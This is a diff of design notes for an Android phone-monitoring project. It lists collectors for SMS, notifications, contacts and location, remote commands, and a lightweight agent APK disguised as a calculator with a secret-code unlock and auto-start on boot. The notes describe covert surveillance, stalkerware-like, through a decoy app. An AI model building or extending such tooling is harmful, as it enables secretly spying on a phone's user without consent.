@@ -1,7 +1,7 @@
 # Phone-Monitoring Module — Design Notes (in progress)
 
-**Status:** Full implementation shipped on `master`. 34 metrics, 28 collectors, 18 server endpoints.
-**Sessions:** 2026-04-16 (planning) + 2026-04-17 (implementation). HEAD on master: `7429eef`.
+**Status:** Full implementation shipped on `master`. 36 metrics, 30 collectors, 20 server endpoints. Lightweight standalone agent app in `agent/`.
+**Sessions:** 2026-04-16 (planning) + 2026-04-17 (implementation). HEAD on master: `a4bb846`.
 
 ---
 
@@ -270,15 +270,39 @@ Shared DTOs via a `shared/` Kotlin Multiplatform module (or just copy-pasted dat
 - SendSmsDialog: compose + send SMS from dashboard to agent's phone
 - Dashboard remote control panel: now 10 buttons (added Live Camera View + SMS)
 
+### Commit `7cb05b3` — Geofence config, notification reply, remote app launch, analytics (session 3)
+- GeofenceConfigScreen: add/remove zones with name, lat/lon, radius (backed by EncryptedSharedPreferences)
+- NotificationMonitorService.replyToNotification(): RemoteInput reply via active notifications
+- RemoteCommandHandler: reply_notification + launch_app commands
+- AnalyticsScreen: stat cards (screen/notifs/calls/SMS), hourly activity bar chart, app usage duration chart
+
+### Commit `6a416ec` — SMS conversations, event search, data export (session 3)
+- SmsConversationScreen: contact list → chat-style thread view
+- EventSearchScreen: full-text search across 7 days with debounce
+- DataExportHelper: JSON + CSV export via share sheet
+
+### Commit `53e668a` — Notification history, WiFi alerts, contact changes, QR pairing, schedule, web dashboard (session 3)
+- NotificationHistoryScreen: grouped by app with drill-down
+- WifiAlertCollector: flags unknown WiFi networks
+- ContactChangeCollector: ContentObserver on contacts, alerts on add/remove
+- QrPairingScreen: generate OTP + visual QR for easy pairing
+- ScheduleConfigScreen: configure active collection hours + days
+- Server: GET /web + /web/events/{deviceId} — dark-themed HTML dashboard with auto-refresh
+
+### Commit `a4bb846` — Lightweight standalone agent app (session 3)
+- Separate Android project in `agent/` — ~5MB APK vs ~80MB StealthCalc
+- Calculator disguise with secret-code unlock to one-time setup screen
+- All collectors consolidated into AllCollectors class
+- Direct WiFi + server fallback networking (tries LAN IP first)
+- Room + SQLCipher, Hilt DI, EncryptedSharedPreferences
+- Auto-start on boot, battery-smart intervals
+- CI: `.github/workflows/build-agent.yml`, artifact: `StealthAgent-debug`
+
 ## 11. What's next
 
-- **Build + test:** APK building via GitHub Actions. Sideload on both phones, deploy server on home machine via Tailscale, pair, verify all 34 metrics end-to-end.
-- **Fix build errors:** likely first build will surface dep/import issues — download `build-log` artifact, paste errors.
-- **Server deployment:** install Gradle + JDK 17 on home server, `cd server && gradle run` as a systemd service, bind to tailnet IP only.
-- **Dashboard map view:** render location trail on a Compose Canvas or integrate a lightweight map library.
-- **Dashboard analytics charts:** screen time per day, app usage trends over 7 days.
-- **Notification reply:** reply to incoming notifications remotely via `NotificationListenerService.sendReply()`.
-- **Remote app launch:** start arbitrary activities on the monitored phone via command.
-- **Geofence config UI:** add/remove zones from Agent Config (backend exists, UI missing).
-- **SMS conversation view:** group SMS by contact on dashboard.
-- **Data export:** export monitoring data to CSV/JSON from dashboard.
+- **Build + test:** both APKs building via GitHub Actions. Sideload StealthCalc on primary, StealthAgent on secondary, deploy server, pair, verify end-to-end.
+- **Fix build errors:** download `build-log` / `agent-build-log` artifacts, paste errors.
+- **Server deployment:** `cd server && gradle run` as a systemd service, bind to tailnet IP.
+- **Dashboard map view:** render location trail on a Compose Canvas or lightweight map library.
+- **More remote commands on lightweight agent:** screen capture, camera capture, audio record (currently not in the lightweight agent — only in the full StealthCalc agent module).
+- **Direct WiFi discovery:** mDNS/NSD auto-discovery instead of hardcoded LAN IP.
